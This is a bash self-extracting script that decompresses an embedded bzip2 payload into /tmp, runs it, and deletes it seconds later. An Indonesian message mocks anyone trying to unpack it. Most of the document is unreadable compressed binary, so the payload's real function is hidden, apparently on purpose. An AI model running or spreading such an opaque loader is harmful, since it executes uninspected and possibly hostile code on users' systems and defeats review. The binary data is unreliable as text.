#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SYo�G >_�u����?�������PD@  PLa�ʹhc��,$�i����SS�O51M2z���z�z��ԍ4�SG�IM1�aL��i4 d @��6� $�I��S����52hG� �4�a1�i�p� �@`�i�d � 	"�bi䧤O(�Bi2<)��OQ�������ځ��M��0ǩ��3}��G3�ҙ�E����Rs��h7�Lo�'�{�����n)���@"�~��N@���sӇ��) �Q���ֳ��]�Fd��$C�w��kP�󂣇��C�*o�tAc���.$�?6vS�eR0�jh���-cy�ha\�i�н�F�X�XA���p�~������*�{�ߙ��[����,opOL#�S���Ve��L_��&dLO#��K��g���H�n�.W1Cm]��X�(7��_/<cvi�څ����x�z�a���u�p����*�k�S�q�U��Wǟ?�E��&h�b}�{K�If�Ugk�� [��B��h�򁬶/���%���^v2��d��8O���\"I^M�Yt�s5C`"_(�7HI�ZJ���W��*f� L�uK�H�
RJ�J<�s�?.��q+bCh�;�d�b�K�Y'X�Hk�o���y]9�G�z��XF>���H�������"\L�d1ͲwZ>���'����[?��%4\\�X��Ac~A)�&�p*5��� 0k37�+{� �o�V��a,)���Ӌ;�W����[��*�4Oё��,���T<È�c]3"~u���
���i��Jh����M��``���.���07u���$ej:��(e����.B���?2+6C1feip@���xD�VNA�q�[[5�s5��V.��$î�+}����OB������2f�cK'�52��A������}&���3NQ��\`���Ky�!z3S�ڴc�؊������+9���L�'���K�#�3�Y������z�$/��l9��!�)9�xU4��k]b��v	MH�^�a��s^X�+�+
�$����RX��Q���@��KA�op��N�M��:\QUJ�e:�nT!ʱNK'��k<b%w2jj��0�Q#Q�(N�'Q�Ap$l�ij 9�ܰ��][�
�6� ���Q�_W�B�by7*INB��rBic�C`�����ԑE�ᕑ�-2
Ǽ8c�'�����L��a2���d�Ŋ�dM�tT\e=�:A��{e3v�C���z���4�U�c�Cd/�xZ��A��a�7N%	n ���U�
�����P��#ڷ�:|�M:�T�9��[�,d������۰�����,��ʑ����@SK2z͎�[ڮ^��8����r�E�?O����HB`�*��� P&c�.�p� ߬�